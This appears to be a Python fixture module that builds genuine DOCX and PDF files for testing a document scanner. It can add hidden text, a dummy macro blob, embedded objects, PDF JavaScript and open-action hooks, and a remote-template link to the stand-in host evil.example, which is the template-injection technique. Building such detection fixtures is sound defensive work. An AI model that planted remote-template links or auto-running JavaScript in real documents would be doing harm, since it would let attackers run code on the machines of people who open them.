"""Builders for real PDF and DOCX files used by the document tests (no mocks: the files are genuine and parse with standard tools)."""

from __future__ import annotations

import io
import zipfile
from typing import Iterable

_CT = ('<?xml version="1.0" encoding="UTF-8"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
       '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
       '<Default Extension="xml" ContentType="application/xml"/>'
       '<Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>'
       '{extra_ct}</Types>')
_RELS = ('<?xml version="1.0" encoding="UTF-8"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
         '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>'
         '{extra}</Relationships>')
_W = "http://schemas.openxmlformats.org/wordprocessingml/2006/main"


def _esc(t: str) -> str:
    return t.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")


def docx(paragraphs: Iterable[str], *, hidden: Iterable[str] = (), macros: bool = False, remote_template: bool = False,
         embedded: bool = False, author: str = "", created: str = "", document_xml: bytes | None = None) -> bytes:
    body = "".join(f"<w:p><w:r><w:t>{_esc(p)}</w:t></w:r></w:p>" for p in paragraphs)
    body += "".join(f"<w:p><w:r><w:rPr><w:vanish/></w:rPr><w:t>{_esc(p)}</w:t></w:r></w:p>" for p in hidden)
    xml = document_xml or (f'<?xml version="1.0" encoding="UTF-8"?><w:document xmlns:w="{_W}"><w:body>{body}</w:body></w:document>').encode()
    extra_ct = '<Override PartName="/docProps/core.xml" ContentType="application/vnd.openxmlformats-package.core-properties+xml"/>' \
        if (author or created) else ""
    extra_rel = ""
    if author or created:
        extra_rel += ('<Relationship Id="rId2" Type="http://schemas.openxmlformats.org/package/2006/relationships/metadata/core-properties" '
                      'Target="docProps/core.xml"/>')
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("[Content_Types].xml", _CT.format(extra_ct=extra_ct))
        z.writestr("_rels/.rels", _RELS.format(extra=extra_rel))
        z.writestr("word/document.xml", xml)
        if author or created:
            z.writestr("docProps/core.xml", (
                '<?xml version="1.0" encoding="UTF-8"?><cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties" '
                'xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:dcterms="http://purl.org/dc/terms/">'
                f'<dc:title>Leave policy</dc:title><dc:creator>{_esc(author)}</dc:creator>'
                f'<dcterms:created>{created}</dcterms:created></cp:coreProperties>'))
        if macros:
            z.writestr("word/vbaProject.bin", b"\xd0\xcf\x11\xe0 macro payload")
        if embedded:
            z.writestr("word/embeddings/oleObject1.bin", b"\xd0\xcf\x11\xe0 object")
        if remote_template:
            z.writestr("word/_rels/settings.xml.rels", (
                '<?xml version="1.0" encoding="UTF-8"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
                '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" '
                'Target="https://evil.example/t.dotm" TargetMode="External"/></Relationships>'))
    return buf.getvalue()


def pdf(pages: Iterable[str] = ("",), *, javascript: str = "", open_action_js: str = "", attachment: bool = False,
        title: str = "", author: str = "", password: str = "") -> bytes:
    from pypdf import PdfWriter
    from pypdf.generic import DecodedStreamObject, DictionaryObject, NameObject, TextStringObject
    w = PdfWriter()
    font = w._add_object(DictionaryObject({NameObject("/Type"): NameObject("/Font"), NameObject("/Subtype"): NameObject("/Type1"),
                                           NameObject("/BaseFont"): NameObject("/Helvetica")}))
    for text in pages:
        page = w.add_blank_page(400, 400)
        if text:
            s = DecodedStreamObject()
            esc = text.replace("\\", "\\\\").replace("(", "\\(").replace(")", "\\)")
            s.set_data(f"BT /F1 11 Tf 20 360 Td ({esc}) Tj ET".encode("latin-1", "replace"))
            page[NameObject("/Resources")] = DictionaryObject(
                {NameObject("/Font"): DictionaryObject({NameObject("/F1"): font})})
            page[NameObject("/Contents")] = w._add_object(s)
    if javascript:
        w.add_js(javascript)
    if open_action_js:
        w._root_object[NameObject("/OpenAction")] = DictionaryObject(
            {NameObject("/S"): NameObject("/JavaScript"), NameObject("/JS"): TextStringObject(open_action_js)})
    if attachment:
        w.add_attachment("notes.txt", b"attached")
    if title or author:
        w.add_metadata({k: v for k, v in (("/Title", title), ("/Author", author)) if v})
    if password:
        w.encrypt(password)
    out = io.BytesIO()
    w.write(out)
    return out.getvalue()
